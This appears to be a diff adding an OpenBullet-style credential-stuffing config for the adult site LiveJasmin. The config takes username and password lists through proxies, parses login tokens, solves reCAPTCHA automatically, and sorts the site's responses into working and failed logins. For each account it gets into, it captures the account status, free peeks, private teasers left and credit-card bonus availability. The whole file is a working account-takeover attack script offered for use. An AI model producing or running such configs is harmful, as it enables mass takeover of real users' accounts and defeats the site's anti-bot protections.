@@ -1,0 +1,88 @@
+[SETTINGS]
+{
+  "Name": "LiveJasmin",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-05T17:31:24.8248455+00:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://www.livejasmin.com/en/girls/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_PAGE_ID PARSE "<SOURCE>" CSS "[name=listPageId]" "content" 0 -> VAR "PAGEID" "" "" 
+FUNCTION CurrentUnixTime "" -> VAR "TIME" 
+#GET_LOGIN_FORM_BLOCK REQUEST GET "https://www.livejasmin.com/en/auth/overlay/get-login-block?_dc=<TIME>000&listPageId=<PAGEID>" AutoRedirect=TRUE 
+  CONTENT "_dc=<TIME>000&listPageId=<PAGEID>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://www.livejasmin.com/en/girls/" 
+  HEADER "Origin: www.livejasmin.com" 
+#PARSE_FORM_TOKEN PARSE "<SOURCE>" LR "name=\\"form_token\\" value=\\"" "\" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#LOGIN REQUEST POST "https://www.livejasmin.com/en/auth/overlay-login" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&form_token=<TOKEN>&captcha=&captcha_id=&keepmeloggedin=1&recaptcha=&listPageId=1728980458633785088" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://www.livejasmin.com/en/girls/?gclid=EAIaIQobChMI2ZSHg5zt2gIV7JPtCh0HbwcwEAAYASAAEgJE9vD_BwE&pstour=t1&psprogram=REVS&pstool=15_1&campaign_id=84861&psid=futuration&psref=https%3A%2F%2Fwww.google.it%2F" 
+  HEADER "Origin: https://www.livejasmin.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password" 
+  KEYCHAIN Success AND 
+    KEY "googleRecaptcha" 
+    KEY "<SOURCE>" DoesNotContain "Incorrect username or password" 
+#PARSE_OTHER_FORM_TOKEN PARSE "<SOURCE>" JSON "form_token" Recursive=FALSE -> VAR "TOKEN2" "" "" 
+RECAPTCHA "https://www.livejasmin.com/en/girls/#!login" "6LeWhEsUAAAAAPotWDI0JTHxmyxkKUXY4UfJ7A4O" -> VAR "RECAP" 
+#LOGIN_2 REQUEST POST "https://www.livejasmin.com/en/auth/overlay-login" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&form_token=<TOKEN2>&captcha=&captcha_id=&keepmeloggedin=1&recaptcha=<RECAP>&listPageId=1728980458633785088" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://www.livejasmin.com/en/girls/?gclid=EAIaIQobChMI2ZSHg5zt2gIV7JPtCh0HbwcwEAAYASAAEgJE9vD_BwE&pstour=t1&psprogram=REVS&pstool=15_1&campaign_id=84861&psid=futuration&psref=https%3A%2F%2Fwww.google.it%2F" 
+  HEADER "Origin: https://www.livejasmin.com" 
+#KEY_CHECK_2 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password" 
+#CAPTURE_FREE_PEEKS PARSE "<SOURCE>" JSON "freePeeksAvailable" Recursive=FALSE -> CAP "Free Peeks" "" "" 
+#PARSE_SESSION_2 PARSE "<SOURCE>" LR "jsm2sessionid\":\"" "\"" Recursive=FALSE -> VAR "SESSION2" "" "" 
+#USER_INFO REQUEST POST "https://www.livejasmin.com/en/free/flash/check-user?session=<SESSION2>" AutoRedirect=TRUE 
+  CONTENT "session=<SESSION2>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.livejasmin.com/en/girls/" 
+  HEADER "Origin: https://www.livejasmin.com" 
+#KEY_CHECK_3 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "guest" 
+#CAPTURE_STATUS PARSE "<SOURCE>" JSON "status" Recursive=FALSE -> CAP "Status" "" "" 
+#CAPTURE_PRIVATE_TEASERS_LEFT PARSE "<SOURCE>" JSON "privateTeaserLeft" Recursive=FALSE -> CAP "Private Teasers Left" "" "" 
+#CAPTURE_CC_BONUS PARSE "<SOURCE>" JSON "isCreditCardBonusAvailable" Recursive=FALSE -> CAP "CC Bonus Available" "" "" 
